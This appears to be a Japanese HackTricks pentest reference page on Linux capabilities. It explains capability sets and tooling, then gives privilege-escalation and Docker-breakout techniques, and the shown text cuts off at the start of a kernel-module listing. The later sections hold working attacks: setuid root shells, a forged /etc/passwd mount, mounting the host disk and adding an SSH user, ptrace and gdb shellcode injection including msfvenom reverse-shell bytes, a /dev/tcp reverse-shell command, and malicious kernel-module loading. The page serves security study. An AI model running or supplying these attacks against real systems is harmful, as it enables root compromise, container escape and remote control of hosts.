# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}

Linux capabilities は、**root 権限をより小さく独立した単位に分割**し、process に権限の一部だけを付与できるようにします。これにより、不要に完全な root 権限を付与せず、リスクを最小限に抑えられます。<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>

### 問題点:

- 通常の user は、raw socket のオープンや 1024 未満の Internet port への bind などの操作が制限されています。capabilities を使用すると、完全な root 権限ではなく、必要な操作だけを付与できます。<sup>[[14]](#references)</sup>

### Capability Sets:

Linux は thread ごとに以下の capability set を公開し、kernel は process が credential を変更したり file を実行したりする際に、それらの制約を適用します。<sup>[[14]](#references)</sup>

1. **Inherited (CapInh)**:

- **目的**: 実行された file に対応する inheritable file capabilities がある場合、`execve()` 後に permitted set に追加される可能性がある capabilities を示します。
- **機能**: thread の inheritable set は `execve()` をまたいで保持されますが、それだけで該当 capabilities が effective になるわけではありません。
- **制限**: この set への capability の追加は、permitted set と bounding set によって制限されます。<sup>[[14]](#references)</sup>

2. **Effective (CapEff)**:

- **目的**: process がその時点で実際に使用している capabilities を示します。
- **機能**: さまざまな操作の許可を与えるために kernel が確認する capabilities の set です。file の場合、この set は、その file の permitted capabilities を effective として扱うかどうかを示す flag にできます。
- **重要性**: effective set は即時の権限チェックに不可欠で、process が使用できる capabilities の active set として機能します。

3. **Permitted (CapPrm)**:

- **目的**: process が保持できる capabilities の最大 set を定義します。
- **機能**: process は permitted set から capability を effective set に昇格させ、その capability を使用できるようにできます。また、permitted set から capabilities を削除することもできます。
- **境界**: この set から capability を削除すると、通常は、それを付与する file の実行や別の privileged transition なしには復元できません。<sup>[[14]](#references)</sup>

4. **Bounding (CapBnd)**:

- **目的**: `execve()` 中に file から process が取得できる capabilities、および process が inheritable set に追加できる capabilities を制限します。
- **機能**: この set は `fork()` をまたいで継承され、`execve()` 後も保持されます。caller が `CAP_SETPCAP` を持っている場合、この set から capabilities を削除できます。
- **用途**: この set から不要な capabilities を削除すると、後続の権限取得を制限できます。<sup>[[14]](#references)</sup>

5. **Ambient (CapAmb)**:
- **目的**: nonprivileged program の `execve()` 後も、選択した capabilities を permitted および effective として維持できるようにします。
- **機能**: 実行された file が privileged でない場合、ambient capabilities は新しい permitted set と effective set に追加されます。
- **制限**: capability は permitted set と inheritable set の両方に存在する間だけ ambient にできます。set-user-ID/set-group-ID file、または capabilities を持つ file を実行すると、ambient set はクリアされます。<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>

## Process と Binary の Capabilities

### Process の Capabilities

特定の process の capabilities を確認するには、/proc directory 内の **status** file を使用します。この file にはより詳細な情報が含まれるため、ここでは Linux capabilities に関係する情報だけに限定します。\
実行中のすべての process では capability 情報が thread ごとに管理され、file capabilities は `security.capability` extended attributes に保存される点に注意してください。<sup>[[14]](#references)[[15]](#references)</sup>

capabilities は /usr/include/linux/capability.h に定義されています。

現在の process の capabilities は `cat /proc/self/status` または `capsh --print` で確認でき、他の process の capabilities は `/proc/<pid>/status` で確認できます。<sup>[[15]](#references)[[26]](#references)</sup>
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
このコマンドは、ほとんどのシステムで5行の capability を返すはずです。<sup>[[15]](#references)</sup>

- CapInh = 継承された capabilities
- CapPrm = 許可された capabilities
- CapEff = 有効な capabilities
- CapBnd = Bounding set
- CapAmb = Ambient capabilities set
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
これらの16進数は意味を成しません。`capsh`ユーティリティを使用すると、capability名にデコードできます。<sup>[[26]](#references)</sup>
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
ここでは、`ping` が使用する **capabilities** を確認します。
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
これでも機能しますが、別のより簡単な方法があります。実行中のプロセスの capabilities を確認するには、**getpcaps** tool の後にプロセス ID（PID）を指定します。また、プロセス ID のリストも受け付けます。<sup>[[22]](#references)</sup>
```bash
getpcaps 1234
```
`cap_net_admin` と `cap_net_raw` を binary に付与してネットワークを sniff した後の `tcpdump` の capabilities を確認します（`tcpdump` はプロセス 9562 で実行されています）。<sup>[[22]](#references)[[25]](#references)</sup>
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
ご覧のとおり、capabilities はプロセスを検査する2つの方法の結果と一致しています。`getpcaps` tool は libcap を使用して対象プロセスの capabilities を照会し、テキスト形式で出力します。1つ以上の PID を受け取ります。<sup>[[22]](#references)</sup>

### Binaries Capabilities

Binaries には、実行時に適用される file capabilities を設定できます。たとえば、`ping` binary には `cap_net_raw` capability が付与されている場合があります。<sup>[[14]](#references)</sup>
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
`getcap -r`を使用して**capabilitiesが付与されたバイナリを検索**できます。<sup>[[23]](#references)</sup>
```bash
getcap -r / 2>/dev/null
```
### capshによるcapabilitiesの削除

現在の bounding set から `CAP_NET_RAW` を削除すると、その capability を必要とするプログラムは、以後それを使用できなくなるはずです。<sup>[[26]](#references)</sup>
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
_capsh_ 自体の出力に加えて、_tcpdump_ コマンド自体もエラーを発生させます。

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

このエラーは、`CAP_NET_RAW` が bounding set から削除された後、`tcpdump` が要求された file capability で実行できないことを示しています。

### Capabilities の削除

`setcap -r` を使用すると、ファイルの capabilities を削除できます。<sup>[[25]](#references)</sup>
```bash
setcap -r </path/to/binary>
```
## User Capabilities

Linux は login user に file capabilities を直接割り当てませんが、`pam_cap` PAM module は `/etc/security/capability.conf` を使用して、認証済み session に inheritable capabilities を設定できます。<sup>[[16]](#references)</sup> 各エントリは、コンマ区切りの capability 名または番号を 1 つ以上の username に割り当てます。<sup>[[17]](#references)</sup>
File example:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Environment Capabilities

以下の program を compile すると、**capabilities を提供する environment 内で bash shell を spawn** できるようになります。<sup>[[14]](#references)</sup>
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
**コンパイルされた ambient binary によって実行される bash** 内では、**new capabilities** を確認できます（通常のユーザーは「current」セクションに capability を持ちません）。<sup>[[14]](#references)</sup>
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> **permitted set と inheritable set の両方に存在する capabilities のみ追加できます。**<sup>[[14]](#references)</sup>

### Capability-aware/Capability-dumb バイナリ

Capability-dumb バイナリとは、file capabilities を持つものの、それらを管理するために libcap を使用しないプログラムです。file effective bit が設定されている場合、kernel はそのファイルの permitted capabilities をプロセスの effective set に有効化します。プロセスがすべての permitted capabilities を取得していない場合、実行に失敗する可能性があります。<sup>[[14]](#references)</sup>

## Service Capabilities

root として実行される system service は、その実行環境によって制限されない限り、広範な capabilities を保持する可能性があります。systemd unit では、`User=` が service user を選択し、`AmbientCapabilities=` が実行されるプロセスの ambient set に指定された capabilities を追加します。<sup>[[18]](#references)</sup>
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Docker Containers 内の Capabilities

Docker は、`--cap-add` と `--cap-drop` で変更できるデフォルトの capability セットでコンテナを起動します。例として、コンテナは `amicontained` で検査できます。<sup>[[19]](#references)[[24]](#references)</sup>
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

Capabilities は、**特権操作を実行した後に自身のプロセスを制限したい場合**（例: chroot を設定してソケットに bind した後）に便利です。ただし、悪意のある commands や arguments を渡すことで悪用でき、それらが root として実行されます。<sup>[[2]](#references)</sup>

`setcap` を使用してプログラムに file capabilities を強制的に設定し、`getcap` で確認できます。<sup>[[23]](#references)[[25]](#references)</sup>
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
ファイル capability のテキストでは、`+ep` により指定した capability が effective set と permitted set で引き上げられ、`-` により選択したフラグが引き下げられます。<sup>[[21]](#references)</sup>

システムまたはフォルダー内で capabilities を持つプログラムを特定するには、`getcap -r` を使用します。<sup>[[23]](#references)</sup>
```bash
getcap -r / 2>/dev/null
```
### Exploitation の例

次の例では、binary `/usr/bin/python2.6` に privesc の脆弱性があることが確認されています。
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
`tcpdump` が **任意のユーザーにパケットを sniff させる**ために必要な **Capabilities**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### "empty" capabilities の特殊なケース

ファイルは空の capability set を保持できます（`getcap myelf` は `myelf =ep` を返します）。空の set は capability を一切付与しませんが、root 所有の set-user-ID bit と組み合わせると、file capabilities を取得せずに、プログラムが実行中のプロセスの effective ID と saved ID を 0 に変更できます。所有者がなく、SUID/SGID ではない `=ep` ファイルは root として実行されません。<sup>[[14]](#references)</sup>

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** は非常に強力な Linux capability であり、デバイスの mount や kernel features の操作など、広範な **administrative privileges** を持つため、しばしば root に近いレベルと見なされます。システム全体をシミュレートする containers には不可欠ですが、**`CAP_SYS_ADMIN` は重大な security challenges をもたらします**。特に containerized environments では、privilege escalation や system compromise に悪用される可能性があります。そのため、この capability の使用には厳格な security assessments と慎重な管理が必要であり、**principle of least privilege** に従い attack surface を最小化するため、application-specific containers ではこの capability を drop することが強く推奨されます。<sup>[[14]](#references)</sup>

namespace pivots では scope が重要です。`setns()` は target を所有する user namespace に対して `CAP_SYS_ADMIN` を確認します。mount namespace に入るには、caller の user namespace における `CAP_SYS_CHROOT` も必要です。private remapped user namespace 内でのみ保持される capability では、initial host namespaces へ任意に入る権限は付与されません。<sup>[[14]](#references)</sup>

**binary を使用した例**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Pythonを使用すると、変更した _passwd_ ファイルを実際の _passwd_ ファイルの上にマウントできます：
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
そして最後に、変更した `passwd` ファイルを `/etc/passwd` に **mount** します。
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
そして、パスワード「password」を使用して **`su` as root** できるようになります。

**環境の例（Docker breakout）**

以下を使用して、docker container 内で有効な capabilities を確認できます：
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
前の出力では、SYS_ADMIN capability が有効になっていることが確認できます。<sup>[[14]](#references)</sup>

- **Mount**

適切な device および namespace へのアクセス権がある場合、これにより Docker container から **host の disk を mount して、その contents にアクセス**できる可能性があります。device node は実際の host device を表している必要があり、device cgroup がそれを許可していなければなりません。また、block-based filesystem の mount には、initial user namespace における `CAP_SYS_ADMIN` が必要です。<sup>[[14]](#references)</sup>
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/sda1 # Replace with the validated filesystem partition or LV.
mkdir -p /mnt/host
mount -o ro "${node_root_device}" /mnt/host
cat /mnt/host/etc/hostname
umount /mnt/host
```
- **完全なアクセス**

前の方法では、host の disk にアクセスできました。\
host が **ssh** server を実行している場合、**mounted disk** 内に **user** を作成し、SSH 経由でアクセスできます。<sup>[[14]](#references)</sup>
```bash
#Like in the example before, the first step is to mount the docker host disk
node_root_device=/dev/sda1
mount "${node_root_device}" /mnt/host

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/host adduser john
ssh john@172.17.0.1 -p 2222
```
`/mnt/host` 配下への直接の読み取りと書き込みは、すでに host-filesystem access です。最後の `chroot` はパス名を簡便に扱うためだけのものであり、さらに `CAP_SYS_CHROOT` が必要です。escape を発生させる手順は `chroot` ではありません。

## CAP_SYS_PTRACE

`CAP_SYS_PTRACE` があると、プロセスは自身の PID namespace から見える他のプロセスを trace および inspect できます。Docker container から host のプロセスを対象にするには、`--pid=host` で host PID namespace を共有するか、対象を含む namespace に join します。<sup>[[14]](#references)[[20]](#references)</sup>

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** は、`ptrace(2)` による debugging および system call tracing 機能と、`process_vm_readv(2)` や `process_vm_writev(2)` のような cross-memory attach call を使用する権限を付与します。diagnostic や monitoring の目的では強力ですが、`ptrace(2)` に対する seccomp filter のような制限策なしで `CAP_SYS_PTRACE` が有効になっていると、system security を大きく損なう可能性があります。具体的には、[このような proof of concept (PoC)](https://gist.github.com/thejh/8346f47e359adecd1d53) で実証されているように、seccomp によって課されたものをはじめとする他の security restriction を回避するために悪用できます。<sup>[[10]](#references)</sup>

**binary を使用した Example (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**binary の例 (gdb)**

`gdb` with `ptrace` capability:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
msfvenomでshellcodeを作成し、gdb経由でメモリに注入する
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
gdbでrootプロセスをデバッグし、前に生成したgdbの行をコピー＆ペーストします：
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**環境を使用した例（Docker breakout） - 別の gdb Abuse**

**GDB** がインストールされている場合（たとえば `apk add gdb` または `apt install gdb` でインストールできます）、**表示可能なホストプロセスを debug** して `system` function を呼び出させることができます。これには、対象の user namespace における有効な `CAP_SYS_PTRACE` と、ホスト PID の可視性が必要です。`CAP_SYS_ADMIN` は必要ありません。Yama、non-dumpable state、seccomp、LSM policy によって attach がブロックされる場合があります。
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
実行された command の output は確認できませんが、その process によって実行されます（そのため、rev shell を取得してください）。

> [!WARNING]
> 「No symbol "system" in current context.」というエラーが発生した場合は、gdb 経由でプログラムに shellcode を読み込む、前の例を確認してください。

**Example with environment (Docker breakout) - Shellcode Injection**

以下を使用して、Docker container 内で有効になっている capabilities を確認できます：
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
**host**で実行中の**processes**を一覧表示する `ps -eaf`

1. **architecture**を取得する `uname -m`
2. そのarchitecture用の**shellcode**を見つける ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. **shellcode**をプロセスのメモリに**inject**する**program**を見つける ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. プログラム内の**shellcode**を**modify**して**compile**する `gcc inject.c -o inject`
5. **inject**して**shell**を取得する: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**は、プロセスに**kernel modules（`init_module(2)`、`finit_module(2)`、`delete_module(2)` system calls）をloadおよびunloadする**権限を与え、kernelのコア操作への直接アクセスを提供します。このcapabilityには重大なsecurity riskがあります。moduleをloadするとkernelの動作を変更でき、isolation boundaryを無効化できる可能性があるためです。<sup>[[6]](#references)[[14]](#references)</sup>
通常のrootful Linux containerでは、対象となるのは**shared host kernel**であるため、これは直接的なbreakoutになります。このcapabilityはinitial user namespaceでeffectiveでなければなりません。module loadingはnamespacedではないためです。gVisor、Kata、Hyper-Vなどのuserspace-kernelまたはVM-isolated runtimeでは、到達可能なkernel boundaryが変わります。module loadingは、`modules_disabled`、kernel lockdown、signature enforcement、seccomp、またはLSMによって引き続きblockされる可能性があります。<sup>[[14]](#references)</sup>

**バイナリの例**

次の例では、バイナリ**`python`**がこのcapabilityを持っています。
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
デフォルトでは、**`modprobe`** コマンドはディレクトリ **`/lib/modules/$(uname -r)`** 内の依存関係リストとマップファイルをチェックします。\
これを悪用するため、偽の **lib/modules** フォルダーを作成します。
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
次に、以下の2つの例を参考に kernel module を compile し、以下のフォルダーに copy します。
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
最後に、この kernel module をロードするために必要な python code を実行します:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**binaryを使用した例2**

以下の例では、binary **`kmod`** にこのcapabilityがあります。
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
つまり、コマンド **`insmod`** を使用して kernel module を挿入できます。以下の例に従い、この権限を悪用して **reverse shell** を取得してください。

**環境を使用した例（Docker breakout）**

以下を使用して、docker container 内で有効な capabilities を確認できます：
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
前の出力では、**SYS_MODULE** capability が有効になっていることが確認できます。<sup>[[14]](#references)</sup>

**reverse shell** を実行する **kernel module** と、それを**コンパイル**するための **Makefile** を**作成**します：
```c:reverse-shell.c
#include <linux/kmod.h>
